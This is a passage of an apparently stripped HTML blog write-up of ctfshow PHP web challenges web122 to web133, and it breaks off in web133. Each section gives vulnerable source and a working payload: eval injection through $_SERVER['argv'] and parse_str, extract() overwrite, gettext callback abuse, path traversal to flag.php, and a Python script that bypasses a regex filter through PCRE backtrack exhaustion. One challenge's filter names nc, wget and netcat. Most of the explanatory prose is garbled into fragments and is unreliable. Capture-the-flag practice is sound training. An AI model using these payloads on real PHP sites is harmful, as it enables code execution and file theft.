class=\"line\">$num=$_GET[&#x27;num&#x27;];</span><br><span class=\"line\">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class=\"line\">    if($num==&#x27;36&#x27;)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo &quot;hacker!!&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!!!&quot;; </span><br></pre></td></tr></table></figure>\n\n<p><code>trim</code></p>\n<blockquote>\n<p> </p>\n<p> <strong>trim()</strong> </p>\n<ul>\n<li>  (ASCII <em>32</em> (<em>0x20</em>))</li>\n<li>\\t (ASCII <em>9</em> (<em>0x09</em>))</li>\n<li>\\n (ASCII <em>10</em> (<em>0x0A</em>))</li>\n<li>\\r (ASCII <em>13</em> (<em>0x0D</em>))</li>\n<li>\\0 (ASCII <em>0</em> (<em>0x00</em>))</li>\n<li>\\x0B (ASCII <em>11</em> (<em>0x0B</em>))</li>\n</ul>\n</blockquote>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">for($i=1;$i&lt;=128;$i++)&#123;</span><br><span class=\"line\">    $a=chr($i).&#x27;1&#x27;;</span><br><span class=\"line\">    if(trim($a)!==&#x27;1&#x27;&amp;&amp;is_numeric($a))&#123;</span><br><span class=\"line\">        echo urlencode(chr($i));</span><br><span class=\"line\">        echo &quot;\\n&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p> %0c()</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=%0c36</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web123\"><a href=\"#web123\" class=\"headerlink\" title=\"web123\"></a>web123</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">$c=$_POST[&#x27;fun&#x27;];</span><br><span class=\"line\">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;</span><br><span class=\"line\">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class=\"line\">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class=\"line\">             echo $flag;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<blockquote>\n<p>phppostget+[[such as<code>CTF[SHOW.COM</code>&#x3D;&gt;<code>CTF_SHOW.COM</code></p>\n</blockquote>\n<p><code>POST</code>  <code>CTF_SHOW.COM</code><code>CTF_SHOW_COM</code></p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST: CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo $flag</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web125\"><a href=\"#web125\" class=\"headerlink\" title=\"web125\"></a>web125</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">$c=$_POST[&#x27;fun&#x27;];</span><br><span class=\"line\">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;</span><br><span class=\"line\">         eval(&quot;$c&quot;.&quot;;&quot;);</span><br><span class=\"line\">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class=\"line\">             echo $flag;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>echo</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>$_SERVER[argv]</p>\n<p>1cli</p>\n<pre><code>$_SERVER[&#39;argv&#39;][0]\n</code></pre>\n<p>2web</p>\n<pre><code>webphp.iniregister_argc_argv\n    \nregister_argc_argv = On(Off)$_SERVER[argv]\n    \n$_SERVER[argv][0] = $_SERVER[QUERY_STRING]\n    \n$argv,$argcweb\n</code></pre>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$_SERVER[argv][0] = $_SERVER[QUERY_STRING]</span><br><span class=\"line\"> $_SERVER[QUERY_STRING] ?</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?$fl0g=flag_give_me;</span><br><span class=\"line\"></span><br><span class=\"line\">POST:CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><code>highlight_file()</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?1=flag.php</span><br><span class=\"line\">POST:CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web126\"><a href=\"#web126\" class=\"headerlink\" title=\"web126\"></a>web126</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">$c=$_POST[&#x27;fun&#x27;];</span><br><span class=\"line\">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;</span><br><span class=\"line\">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class=\"line\">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class=\"line\">             echo $flag;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get: a=1+fl0g=flag_give_me</span><br><span class=\"line\">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure>\n\n<p>(url)<code>$a[1]</code><code>fl0g=flag_give_me</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get: a=1+2+fl0g=flag_give_me//url</span><br><span class=\"line\">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[2])</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class=\"line\">var_dump($a);</span><br><span class=\"line\"></span><br><span class=\"line\"> a=1+fl0g=flag_give_me</span><br><span class=\"line\"></span><br><span class=\"line\">array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web127\"><a href=\"#web127\" class=\"headerlink\" title=\"web127\"></a>web127</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$ctf_show = md5($flag);</span><br><span class=\"line\">$url = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//</span><br><span class=\"line\">function waf($url)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $url))&#123;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(waf($url))&#123;</span><br><span class=\"line\">    die(&quot;&quot;);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    extract($_GET);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if($ctf_show===&#x27;ilove36d&#x27;)&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p><code>$_SERVER[&#39;QUERY_STRING&#39;];</code>urlurl</p>\n</blockquote>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">function waf($num)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $num))&#123;</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">for($i = 0; $i&lt;129; $i++)&#123;</span><br><span class=\"line\">\t$num=chr($i);</span><br><span class=\"line\">\tif(waf($num))&#123;</span><br><span class=\"line\">\t\techo &quot;&quot;.$num.&quot;   &quot;.urlencode(chr($i)).&quot;\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>%20</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ctf show=ilove36d</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web128\"><a href=\"#web128\" class=\"headerlink\" title=\"web128\"></a>web128</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">$f1 = $_GET[&#x27;f1&#x27;];</span><br><span class=\"line\">$f2 = $_GET[&#x27;f2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">if(check($f1))&#123;</span><br><span class=\"line\">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">function check($str)&#123;</span><br><span class=\"line\">    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>wp</p>\n<p>gettext</p>\n<p> _()  gettext()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo gettext(&quot;phpinfo&quot;);</span><br><span class=\"line\">  phpinfo</span><br><span class=\"line\"></span><br><span class=\"line\">echo _(&quot;phpinfo&quot;);</span><br><span class=\"line\"> phpinfo</span><br></pre></td></tr></table></figure>\n\n<p> <code>call_user_func(&#39;_&#39;,&#39;phpinfo&#39;)</code> phpinfo</p>\n<p>flagflag.phpget_defined_vars</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get_defined_vars ( void ) : array</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web129\"><a href=\"#web129\" class=\"headerlink\" title=\"web129\"></a>web129</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;f&#x27;]))&#123;</span><br><span class=\"line\">    $f = $_GET[&#x27;f&#x27;];</span><br><span class=\"line\">    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;</span><br><span class=\"line\">        echo readfile($f);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><code>../</code>   </p>\n<p><code>./</code>    </p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?f=../../ctfshow../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web130\"><a href=\"#web130\" class=\"headerlink\" title=\"web130\"></a>web130</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class=\"line\">    $f = $_POST[&#x27;f&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class=\"line\">        die(&#x27;bye!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;</span><br><span class=\"line\">        die(&#x27;bye!!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>preg_matchfalse10</p>\n<p>if(0 &#x3D;&#x3D;&#x3D; flase)false0false</p>\n<p>stripos()nullnull!&#x3D;&#x3D;flase</p>\n</blockquote>\n<p>&#x2F;s.+?+?1ctfshowf&#x3D;ctfshow</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?f=ctfshow[]</span><br><span class=\"line\">?f[]=1</span><br><span class=\"line\">?f=ctfshow  (ctfshow)</span><br></pre></td></tr></table></figure>\n\n<p>pPCRE</p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\" >https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p>PHPreDOSpcre<code>pcre.backtrack_limit</code><code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code></p>\n<p>PHP</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">url=&quot;http://e07a37a6-9144-4f12-a24c-2fcd2f8cdbd0.challenge.ctf.show/&quot;</span><br><span class=\"line\">data=&#123;</span><br><span class=\"line\">    &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r=requests.post(url,data=data)</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web131\"><a href=\"#web131\" class=\"headerlink\" title=\"web131\"></a>web131</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class=\"line\">    $f = (String)$_POST[&#x27;f&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class=\"line\">        die(&#x27;bye!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;</span><br><span class=\"line\">        die(&#x27;bye!!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>PCRE</p>\n<h3 id=\"web132\"><a href=\"#web132\" class=\"headerlink\" title=\"web132\"></a>web132</h3><p>&#x2F;admin</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    $username = (String)$_GET[&#x27;username&#x27;];</span><br><span class=\"line\">    $password = (String)$_GET[&#x27;password&#x27;];</span><br><span class=\"line\">    $code = (String)$_GET[&#x27;code&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        if($code == &#x27;admin&#x27;)&#123;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if(false &amp;&amp; false || true)&#123;</span><br><span class=\"line\">\techo &quot;true!&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;false!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//true</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=admin&amp;password=admin&amp;username=admin</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web133\"><a href=\"#web133\" class=\"headerlink\" title=\"web133\"></a>web133</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">//flag.php</span><br><span class=\"line\">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class=\"line\">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;</span><br><span class=\"line\">        eval(substr($F,0,6));</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;6?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 